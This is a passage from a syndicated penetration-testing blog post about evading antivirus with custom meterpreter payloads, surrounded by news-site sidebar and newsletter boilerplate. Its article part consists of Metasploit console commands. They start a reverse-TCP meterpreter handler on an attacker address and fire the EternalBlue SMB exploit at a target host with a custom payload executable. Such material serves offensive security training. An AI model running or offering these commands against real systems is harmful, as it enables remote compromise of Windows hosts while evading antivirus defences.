https://www.virtuesecurity.com/wp-content/uploads/2020/02/static-linked-payload-600x200.png 600w" sizes="(max-width: 640px) 100vw, 640px"></p><h3>Starting a meterpreter handler</h3><p>On our attacking system we will now create a handler to accept incoming connection from our payload. We should ensure the IP and port are the same as used in previous steps:</p><pre><code>msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpPAYLOAD =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 10.0.0.5LHOST =&gt; 10.0.0.5msf5 exploit(multi/handler) &gt; set LPORT 9090LPORT =&gt; 9090msf5 exploit(multi/handler) &gt; exploit -j[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 10.0.0.5:9090</code></pre><p>To launch our shiny new payload as part of an exploit, we can use the <code>generic/custom</code> payload and specify the filename of our binary:</p><pre><code>msf5 &gt; use windows/smb/ms17_010_eternalbluemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload generic/custompayload =&gt; generic/custommsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payloadfile /home/demo/Project1.exepayloadfile =&gt; /home/demo/Project1.exemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.0.0.30RHOSTS =&gt; 10.0.0.30msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</code></pre></div></br><div class="su-box su-box-style-default" id="" style="border-color:#2e5d88;border-radius:4px"><div class="su-box-title" style="background-color:#6190bb;color:#FFFFFF;border-top-left-radius:2px;border-top-right-radius:2px">Recent Articles By Author</div><div class="su-box-content su-u-clearfix su-u-trim" style="border-bottom-left-radius:2px;border-bottom-right-radius:2px">
+<ul class="su-posts su-posts-default-loop"> 
+
+
+<li id="su-post-1849560" class="su-post"><a href="https://securityboulevard.com/2020/06/5-tips-for-selecting-a-penetration-testing-company-in-2020/">5 Tips for selecting a penetration testing company in 2020</a></li>
+
+</ul>
+<img alt='' src='https://secure.gravatar.com/avatar/155e993193d31a6c290e07bd75cc1f8d?s=32&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/155e993193d31a6c290e07bd75cc1f8d?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/><span class='byline'><span class='author vcard'><i style='color:#888; margin-right: 5px; display:inline;'></i>
+									<a style='font-size: 16px;' class='url fn n' href='https://securityboulevard.com/author/elliott/' title=''>More from Elliott</a><br/>
+									</span></span></div></div>
+<p class="syndicated-attribution">*** This is a Security Bloggers Network syndicated blog from <a href="https://www.virtuesecurity.com">Blog – Virtue Security</a> authored by <a href="https://securityboulevard.com/author/0/" title="Read other posts by Elliott">Elliott</a>. Read the original post at: <a href="https://www.virtuesecurity.com/evading-antivirus-with-better-meterpreter-payloads/">https://www.virtuesecurity.com/evading-antivirus-with-better-meterpreter-payloads/</a> </p>		</div>
+
+		
+  		<div class="below-entry-meta">
+		<div class="below-entry-meta">
+		<span class="posted-on"><a href="https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/" title="6:13 pm" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-02-06T18:13:16-05:00">February 6, 2020</time><time class="updated" datetime="2020-03-06T22:28:36-05:00">March 6, 2020</time></a></span>
+		<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/elliott/" title="Elliott">Elliott</a></span></span>
+
+		
+		<span class="tag-links"><i class="fa fa-tags"></i><a href="https://securityboulevard.com/tag/network/" rel="tag">network</a></span></div>		</div>
+
+		
+        <!-- Jamal added this code - Saleem modified 9/2  
+                    <p>This is a Security Bloggers Network syndicated blog post. Read the original at: 
+                <a href="https://www.virtuesecurity.com/evading-antivirus-with-better-meterpreter-payloads/">Blog – Virtue Security                    2020-02-06</a>.</p>
+         -->
+        <!-- ends here -->
+
+        
+	</div>
+
+		<div class="entry-content clearfix">
+			</div>
+</article>
+
+				
+			
+		</div><!-- #content -->
+
+		
+			<ul class="default-wp-page clearfix">
+				<li class="previous"><a href="https://securityboulevard.com/2020/02/best-practices-for-iot-security/" rel="prev"><span class="meta-nav">&larr;</span> Best Practices For IoT Security</a></li>
+				<li class="next"><a href="https://securityboulevard.com/2020/02/mfa-zero-trust-passwordless-and-more-blogs-you-loved-in-2019/" rel="next">MFA, Zero Trust, Passwordless and More &#8211; Blogs YOU Loved in 2019 <span class="meta-nav">&rarr;</span></a></li>
+			</ul>
+				
+			
+			
+					
+		
+	</div><!-- #primary -->
+
+	
+<div id="secondary">
+			
+		<aside id="custom_html-36" class="widget_text widget widget_custom_html clearfix"><h3 class="widget-title"><span>TechStrong TV &#8211; Live Streaming</span></h3><div class="textwidget custom-html-widget"><div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://vimeo.com/event/183014/embed?muted=1" frameborder="0" allow="autoplay; fullscreen" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe></div>
+<center><a href="https://digitalanarchist.com/videos/latest-shows-techstrong-tv">TechStrong TV - All Episodes</a></center></div></aside><aside id="custom_html-33" class="widget_text widget widget_custom_html clearfix"><div class="textwidget custom-html-widget"><div class="su-row">
+<div class="su-box su-box-style-default" id="" style="border-color:#2e5d88;border-radius:4px"><div class="su-box-title" style="background-color:#6190bb;color:#FFFFFF;border-top-left-radius:2px;border-top-right-radius:2px"><span style='font-weight: normal'><a href='https://securityboulevard.com/syndication_blog/?source=Blog%20-%20Sonrai%20Security&feed_id=710&blog_url=https://sonraisecurity.com' style='color: #fff'>Featured Blog <i class='fa fa-angle-double-right' style='color: #fff' style='font-weight: normal' aria-hidden='true'></i></a></span></div><div class="su-box-content su-u-clearfix su-u-trim" style="border-bottom-left-radius:2px;border-bottom-right-radius:2px"> <a href=https://securityboulevard.com/syndication_blog/?source=Blog%20-%20Sonrai%20Security&#038;feed_id=710&#038;blog_url=https://sonraisecurity.com> <img width="600" height="178" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/sonrai-security-logo.png" class="attachment-full size-full" alt="" loading="lazy" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/sonrai-security-logo.png 600w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/sonrai-security-logo-300x89.png 300w" sizes="(max-width: 600px) 100vw, 600px" /> </a> </br> <div class="pt-cv-wrapper"><div class="pt-cv-view pt-cv-grid pt-cv-colsys pt-cv-post-border" id="pt-cv-view-1bf372c1t0"><div data-id="pt-cv-page-1" class="pt-cv-page" data-cvc="1"><div class="col-md-12 col-sm-12 col-xs-12 pt-cv-content-item pt-cv-1-col"  data-pid="1859872"><div class='pt-cv-ifield'><div class="pt-cv-meta-fields"><span class="author"> <a href="https://securityboulevard.com/author/eric-kedrosky/" rel="author">Eric Kedrosky</a></span></div>
+<h4 class="pt-cv-title"><a href="https://securityboulevard.com/2020/09/the-future-of-multi-cloud-security-a-look-ahead-at-intelligent-cloud-security-posture-management-solutions/" class="_self cvplbd" target="_self" rel="noopener noreferrer">The Future of Multi-Cloud Security: A Look Ahead at Intelligent Cloud Security Posture Management Solutions</a></h4></div></div></div></div></div>			<style type="text/css" id="pt-cv-inline-style-e25a00buea">#pt-cv-view-1bf372c1t0 .pt-cv-content-item { padding-top: 0px !important; padding-left: 1px !important; padding-bottom: 0px !important; padding-right: 0px !important; }
+#pt-cv-view-1bf372c1t0  { margin-top: 1px !important; margin-left: 1px !important; margin-bottom: 1px !important; margin-right: 1px !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-ifield { padding-top: 0px !important; padding-left: 1px !important; padding-bottom: 0px !important; padding-right: 0px !important; }
+#pt-cv-view-1bf372c1t0.pt-cv-post-border { margin: 0; border-top-width: 1px; border-left-width: 1px }
+#pt-cv-view-1bf372c1t0.pt-cv-post-border { margin: 0; border-top-style: solid; border-left-style: solid }
+#pt-cv-view-1bf372c1t0.pt-cv-post-border { margin: 0; border-top-color: #eaeaea; border-left-color: #eaeaea }
+#pt-cv-view-1bf372c1t0.pt-cv-post-border .pt-cv-content-item   { border-right-width: 1px; border-bottom-width: 1px; border-right-style: solid; border-bottom-style: solid; border-right-color: #eaeaea; border-bottom-color: #eaeaea; }
+#pt-cv-view-1bf372c1t0 .pt-cv-title a, #pt-cv-view-1bf372c1t0  .panel-title { font-family: 'Source Sans Pro', Arial, serif !important; font-size: 16px !important; line-height: 1.3 !important; }
+#pt-cv-view-1bf372c1t0  .pt-cv-title a:hover, #pt-cv-view-1bf372c1t0  .panel-title:hover   { font-family: 'Source Sans Pro', Arial, serif !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-content , #pt-cv-view-1bf372c1t0  .pt-cv-content *:not(.pt-cv-readmore):not(style):not(script) { font-family: 'Source Sans Pro', Arial, serif !important; font-size: 16px !important; line-height: 1.3 !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-carousel-caption  { background-color: rgba(51,51,51,.6) !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-meta-fields .glyphicon {font-family: 'Glyphicons Halflings' !important; line-height: 1 !important;}
+#pt-cv-view-1bf372c1t0 .pt-cv-meta-fields * { font-family: 'Roboto', Arial, serif !important; font-size: 12px !important; line-height: 1.3 !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-specialp { background-color: #CC3333 !important }
+#pt-cv-view-1bf372c1t0 .pt-cv-specialp * { color: #fff !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-pficon  { color: #bbb !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-custom-fields * { font-family: 'Roboto', Arial, serif !important; font-size: 12px !important; line-height: 1.3 !important; display: block !important; text-align: left !important; clear: both !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-readmore  { font-family: 'Roboto', Arial, serif !important; color: #ffffff !important; background-color: #6190bb !important; }
+#pt-cv-view-1bf372c1t0 .pt-cv-readmore:hover  { font-family: 'Roboto', Arial, serif !important; color: #ffffff !important; background-color: #00aeef !important; }
+#pt-cv-view-1bf372c1t0  + .pt-cv-pagination-wrapper .pt-cv-more-inactive , #pt-cv-view-1bf372c1t0  + .pt-cv-pagination-wrapper .pagination a { font-family: 'Source Sans Pro', Arial, serif !important; }
+#pt-cv-view-1bf372c1t0  + .pt-cv-pagination-wrapper .pt-cv-more , #pt-cv-view-1bf372c1t0  + .pt-cv-pagination-wrapper .pagination .active a { font-family: 'Source Sans Pro', Arial, serif !important; color: #ffffff !important; background-color: #6190bb !important; }</style>
+			<link href='//fonts.googleapis.com/css?family=Source+Sans+Pro' rel='stylesheet' type='text/css'><link href='//fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'><div class="pt-cv-wrapper"><div class="pt-cv-view pt-cv-grid pt-cv-colsys pt-cv-post-border pt-cv-reused" id="pt-cv-view-50f7388ife"><div data-id="pt-cv-page-1" class="pt-cv-page" data-cvc="1"><div class="col-md-12 col-sm-12 col-xs-12 pt-cv-content-item pt-cv-1-col"  data-pid="1862121"><div class='pt-cv-ifield'><div class="pt-cv-meta-fields"><span class="author"> <a href="https://securityboulevard.com/author/eric-kedrosky/" rel="author">Eric Kedrosky</a></span></div>
+<h4 class="pt-cv-title"><a href="https://securityboulevard.com/2020/10/what-healthcare-organizations-need-to-know-about-cloud-drift/" class="_self cvplbd" target="_self" rel="noopener noreferrer">What Healthcare Organizations Need To Know About Cloud Drift</a></h4></div></div>
+<div class="col-md-12 col-sm-12 col-xs-12 pt-cv-content-item pt-cv-1-col"  data-pid="1862020"><div class='pt-cv-ifield'><div class="pt-cv-meta-fields"><span class="author"> <a href="https://securityboulevard.com/author/sonrai-security-marketing/" rel="author">Sonrai Security Marketing</a></span></div>
+<h4 class="pt-cv-title"><a href="https://securityboulevard.com/2020/10/sonrai-security-announces-20m-in-series-b-funding/" class="_self cvplbd" target="_self" rel="noopener noreferrer">Sonrai Security Announces $20M in Series B Funding</a></h4></div></div></div></div></div>			<style type="text/css" id="pt-cv-inline-style-b9111e14hs">#pt-cv-view-50f7388ife .pt-cv-content-item { padding-top: 0px !important; padding-left: 1px !important; padding-bottom: 0px !important; padding-right: 0px !important; }
+#pt-cv-view-50f7388ife  { margin-top: 1px !important; margin-left: 1px !important; margin-bottom: 1px !important; margin-right: 1px !important; }
+#pt-cv-view-50f7388ife .pt-cv-ifield { padding-top: 0px !important; padding-left: 1px !important; padding-bottom: 0px !important; padding-right: 0px !important; }
+#pt-cv-view-50f7388ife.pt-cv-post-border { margin: 0; border-top-width: 1px; border-left-width: 1px }
+#pt-cv-view-50f7388ife.pt-cv-post-border { margin: 0; border-top-style: solid; border-left-style: solid }
+#pt-cv-view-50f7388ife.pt-cv-post-border { margin: 0; border-top-color: #eaeaea; border-left-color: #eaeaea }
+#pt-cv-view-50f7388ife.pt-cv-post-border .pt-cv-content-item   { border-right-width: 1px; border-bottom-width: 1px; border-right-style: solid; border-bottom-style: solid; border-right-color: #eaeaea; border-bottom-color: #eaeaea; }
+#pt-cv-view-50f7388ife .pt-cv-title a, #pt-cv-view-50f7388ife  .panel-title { font-family: 'Source Sans Pro', Arial, serif !important; font-size: 16px !important; line-height: 1.3 !important; }
+#pt-cv-view-50f7388ife  .pt-cv-title a:hover, #pt-cv-view-50f7388ife  .panel-title:hover   { font-family: 'Source Sans Pro', Arial, serif !important; }
+#pt-cv-view-50f7388ife .pt-cv-content , #pt-cv-view-50f7388ife  .pt-cv-content *:not(.pt-cv-readmore):not(style):not(script) { font-family: 'Source Sans Pro', Arial, serif !important; font-size: 16px !important; line-height: 1.3 !important; }
+#pt-cv-view-50f7388ife .pt-cv-carousel-caption  { background-color: rgba(51,51,51,.6) !important; }
+#pt-cv-view-50f7388ife .pt-cv-meta-fields .glyphicon {font-family: 'Glyphicons Halflings' !important; line-height: 1 !important;}
+#pt-cv-view-50f7388ife .pt-cv-meta-fields * { font-family: 'Roboto', Arial, serif !important; font-size: 12px !important; line-height: 1.3 !important; }
+#pt-cv-view-50f7388ife .pt-cv-specialp { background-color: #CC3333 !important }
+#pt-cv-view-50f7388ife .pt-cv-specialp * { color: #fff !important; }
+#pt-cv-view-50f7388ife .pt-cv-pficon  { color: #bbb !important; }
+#pt-cv-view-50f7388ife .pt-cv-custom-fields * { font-family: 'Roboto', Arial, serif !important; font-size: 12px !important; line-height: 1.3 !important; display: block !important; text-align: left !important; clear: both !important; }
+#pt-cv-view-50f7388ife .pt-cv-readmore  { font-family: 'Roboto', Arial, serif !important; color: #ffffff !important; background-color: #6190bb !important; }
+#pt-cv-view-50f7388ife .pt-cv-readmore:hover  { font-family: 'Roboto', Arial, serif !important; color: #ffffff !important; background-color: #00aeef !important; }
+#pt-cv-view-50f7388ife  + .pt-cv-pagination-wrapper .pt-cv-more-inactive , #pt-cv-view-50f7388ife  + .pt-cv-pagination-wrapper .pagination a { font-family: 'Source Sans Pro', Arial, serif !important; }
+#pt-cv-view-50f7388ife  + .pt-cv-pagination-wrapper .pt-cv-more , #pt-cv-view-50f7388ife  + .pt-cv-pagination-wrapper .pagination .active a { font-family: 'Source Sans Pro', Arial, serif !important; color: #ffffff !important; background-color: #6190bb !important; }</style>
+			<link href='//fonts.googleapis.com/css?family=Source+Sans+Pro' rel='stylesheet' type='text/css'><link href='//fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'> </div></div></div></div></aside><style type="text/css">body #gform_wrapper_10 .gform_footer .gform_button {border-style: solid;background-color:#434366;width:100%;border-radius:10px;-web-border-radius:10px;-moz-border-radius:10px;border-width: 0px;}body #gform_wrapper_10 .gform_page_footer .gform_button{border-style: solid;background-color:#434366;width:100%;border-radius:10px;-web-border-radius:10px;-moz-border-radius:10px;border-width: 0px;}body #gform_wrapper_10 .gform_page_footer .gform_button:hover {border-style: solid;background-color:#1e73be;}body #gform_wrapper_10 .gform_footer .gform_button:hover {border-style: solid;background-color:#1e73be;}body #gform_wrapper_10 .gform_footer button.mdc-button {background-color:#434366;width:100%;border-radius:10px;-web-border-radius:10px;-moz-border-radius:10px;border-width: 0px;}body #gform_wrapper_10 .gform_footer button.mdc-button:hover {background-color:#1e73be;}body #gform_wrapper_10 .gform_footer {}body #gform_wrapper_10 .gform_body .gform_page_footer .gform_next_button {border-style: solid;background: #434366;border-radius: 10px;-web-border-radius: 10px;-moz-border-radius: 10px;}body #gform_wrapper_10 .gform_body .gform_page_footer .gform_next_button:hover {background: #1e73be;}body #gform_wrapper_10 .gform_body .gform_page_footer .gform_previous_button {background: #434366;border-radius: 10px;-web-border-radius: 10px;-moz-border-radius: 10px;}body #gform_wrapper_10 .gform_body .gform_page_footer .gform_previous_button:hover {background: #1e73be;}body #gform_wrapper_10 .gform_body .gform_page_footer .gform_button {background: #434366;border-radius: 10px;-web-border-radius: 10px;-moz-border-radius: 10px;}body #gform_wrapper_10 .gform_body .gform_page_footer .gform_button:hover {background:#1e73be;}/* Styling for Tablets */@media only screen and ( max-width: 800px ) and ( min-width:481px ) {}/* Styling for phones */@media only screen and ( max-width: 480px ) {}/*Option to add custom CSS */</style><aside id="custom_html-29" class="widget_text widget widget_custom_html clearfix"><h3 class="widget-title"><span>Subscribe to our Newsletters</span></h3><div class="textwidget custom-html-widget"><div class="sue-panel" data-url="" data-target="self" style="background-color:#ffffff;color:#333333;border-radius:1px;-moz-border-radius:1px;-webkit-border-radius:1px;box-shadow:0px 1px 2px #eeeeee;-moz-box-shadow:0px 1px 2px #eeeeee;-webkit-box-shadow:0px 1px 2px #eeeeee;border:1px solid #e5e5e5"><div class="sue-panel-content sue-content-wrap" style="padding:15px;text-align:center">
+
+                <div class='gf_browser_chrome gform_wrapper' id='gform_wrapper_10' ><div id='gf_10' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_10' id='gform_10'  action='/2020/02/evading-antivirus-with-better-meterpreter-payloads/#gf_10'> 
+ <input type='hidden' class='gforms-pum' value='{"closepopup":false,"closedelay":0,"openpopup":false,"openpopup_id":0}' />
+                        <div class='gform_heading'>
+                            <span class='gform_description'>Get breaking news, free eBooks and upcoming events delivered to your inbox.</span>
+                        </div>
+                        <div class='gform_body'><ul id='gform_fields_10' class='gform_fields top_label form_sublabel_below description_below'><li id='field_10_1'  class='gfield gfield_contains_required field_sublabel_below field_description_below hidden_label gfield_visibility_visible' ><label class='gfield_label' for='input_10_1' >Email<span class='gfield_required'>*</span></label><div class='ginput_container ginput_container_email'>
+                            <input name='input_1' id='input_10_1' type='text' value='' class='large'   placeholder='Your Email' aria-required="true" aria-invalid="false" />
+                        </div></li><li id='field_10_2'  class='gfield gfield_html gfield_html_formatted gfield_no_follows_desc field_sublabel_below field_description_below gfield_visibility_visible' ><div class="gsection_description"><a href="https://securityboulevard.com/privacy-policy/">View Security Boulevard <u>Privacy Policy</u></a></div></li>
+                            </ul></div>
+        <div class='gform_footer top_label'> <input type='submit' id='gform_submit_button_10' class='gform_button button' value='Subscribe Now'  onclick='if(window["gf_submitting_10"]){return false;}  window["gf_submitting_10"]=true;  ' onkeypress='if( event.keyCode == 13 ){ if(window["gf_submitting_10"]){return false;} window["gf_submitting_10"]=true;  jQuery("#gform_10").trigger("submit",[true]); }' /> <input type='hidden' name='gform_ajax' value='form_id=10&amp;title=&amp;description=1&amp;tabindex=0' />
+            <input type='hidden' class='gform_hidden' name='is_submit_10' value='1' />
+            <input type='hidden' class='gform_hidden' name='gform_submit' value='10' />
+            
+            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
+            <input type='hidden' class='gform_hidden' name='state_10' value='WyJbXSIsIjM1YTY2NzRhN2U3YzkwOTNmM2Y5MjMyNTE2ZTg5NmQ5Il0=' />
+            <input type='hidden' class='gform_hidden' name='gform_target_page_number_10' id='gform_target_page_number_10' value='0' />
+            <input type='hidden' class='gform_hidden' name='gform_source_page_number_10' id='gform_source_page_number_10' value='1' />
+            <input type='hidden' name='gform_field_values' value='' />
+            
+        </div>
+                        </form>
+                        </div>
+                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_10' id='gform_ajax_frame_10' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
+                <script type='text/javascript'>jQuery(document).ready(function($){gformInitSpinner( 10, 'https://securityboulevard.com/wp-content/plugins/gravityforms/images/spinner.gif' );jQuery('#gform_ajax_frame_10').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_10');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_10').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_10').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_10').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_10').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_10').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_10').val();gformInitSpinner( 10, 'https://securityboulevard.com/wp-content/plugins/gravityforms/images/spinner.gif' );jQuery(document).trigger('gform_page_loaded', [10, current_page]);window['gf_submitting_10'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_10').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_10').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [10]);window['gf_submitting_10'] = false;}, 50);}else{jQuery('#gform_10').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [10, current_page]);} );} );</script><script type='text/javascript'> jQuery(document).bind('gform_post_render', function(event, formId, currentPage){if(formId == 10) {if(typeof Placeholders != 'undefined'){
+                        Placeholders.enable();
+                    }} } );jQuery(document).bind('gform_post_conditional_logic', function(event, formId, fields, isInit){} );</script><script type='text/javascript'> jQuery(document).ready(function(){jQuery(document).trigger('gform_post_render', [10, 1]) } ); </script>
+</div></div>
+
+</div></aside><aside class='widget_text widget widget_custom_html clearfix new-html-widget new-popular-widget'>
+					<h3 class='widget-title'>
+					<span>Most Read on the Boulevard</span>
+					</h3>
+					<div class='textwidget custom-html-widget'><div class='pop-div'><a href='https://securityboulevard.com/2020/10/coinbit-seizure-why-new-cryptocurrency-exchanges-conduct-wash-trading/'>Coinbit Seizure: Why New Cryptocurrency Exchanges Conduct Wash Trading  </a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/bleedingtooth-intel-discloses-early-angering-linux-lovers/'>BleedingTooth: Intel Discloses Early, Angering Linux Lovers</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/the-good-and-not-so-good-of-the-iot-cybersecurity-improvement-act-of-2020/'>The Good and Not So Good of the IoT Cybersecurity Improvement Act of 2020</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/5-security-holes-revealed-in-cybersecurity-asset-management/'>5 Security Holes Most Often Revealed via Cybersecurity Asset Management</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/pandemic-pushes-security-analysts-to-the-brink/'>Pandemic Pushes Security Analysts to the Brink</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/interplanetary-storm-botnet-shows-signs-of-anonymization-purpose-proxy-for-hire-infrastructure/'>Interplanetary Storm Botnet Shows Signs of Anonymization-Purpose Proxy-for-Hire Infrastructure</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/tools-for-remote-team-management-communication-security-wordpress-businesses-should-use/'>Tools for remote team management, communication &amp; security WordPress businesses should use</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/new-research-reveals-companies-are-losing-the-web-application-security-war/'>New Research Reveals Companies Are Losing the Web Application Security War</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/breach-at-dickeys-bbq-smokes-3m-cards/'>Breach at Dickey’s BBQ Smokes 3M Cards</a></div><div class='pop-div'><a href='https://securityboulevard.com/2020/10/sonrai-security-announces-20m-in-series-b-funding/'>Sonrai Security Announces $20M in Series B Funding</a></div></div></aside><aside class='widget_text widget widget_custom_html clearfix new-html-widget'>
+						<h3 class='widget-title'>
+						<span><a href='http://www.securityboulevard.com/events/category/webinar/'>Upcoming Webinars <i class='fa fa-angle-double-right' aria-hidden='true'></i></a></span>
+						</h3>
+						<div class='textwidget custom-html-widget'>
+		<!-- Event  -->
+		<div class="type-tribe_events post-1860924 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Wed			</span>
+		
+		<span class="list-daynumber">21</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/the-future-of-active-host-vulnerability-monitoring/" rel="bookmark">The Future of Active Host Vulnerability Monitoring</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">October 21 @ 11:00 am</span> - <span class="tribe-event-time">12:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1861400 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Tue			</span>
+		
+		<span class="list-daynumber">27</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/more-than-monitoring-how-observability-takes-you-from-firefighting-to-fire-prevention/" rel="bookmark">More Than Monitoring: How Observability Takes You From Firefighting to Fire Prevention</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">October 27 @ 8:00 am</span> - <span class="tribe-event-time">9:00 am</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1860927 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Wed			</span>
+		
+		<span class="list-daynumber">28</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/best-practices-for-driving-software-quality-through-a-federated-application-security-responsibility-model/" rel="bookmark">Best Practices for Driving Software Quality through a Federated Application Security Responsibility Model</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">October 28 @ 1:00 pm</span> - <span class="tribe-event-time">2:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1862085 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Thu			</span>
+		
+		<span class="list-daynumber">29</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/how-to-make-the-promise-of-machine-learning-a-reality/" rel="bookmark">How to Make the Promise of Machine Learning a Reality</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">October 29 @ 3:00 pm</span> - <span class="tribe-event-time">4:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1862095 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Nov			</span>
+		
+		<span class="list-daynumber">03</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/cyber-threat-intelligence-highlights-and-trends-for-2020/" rel="bookmark">Cyber Threat Intelligence: Highlights and Trends for 2020</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">November 3 @ 9:00 am</span> - <span class="tribe-event-time">10:00 am</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1862153 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
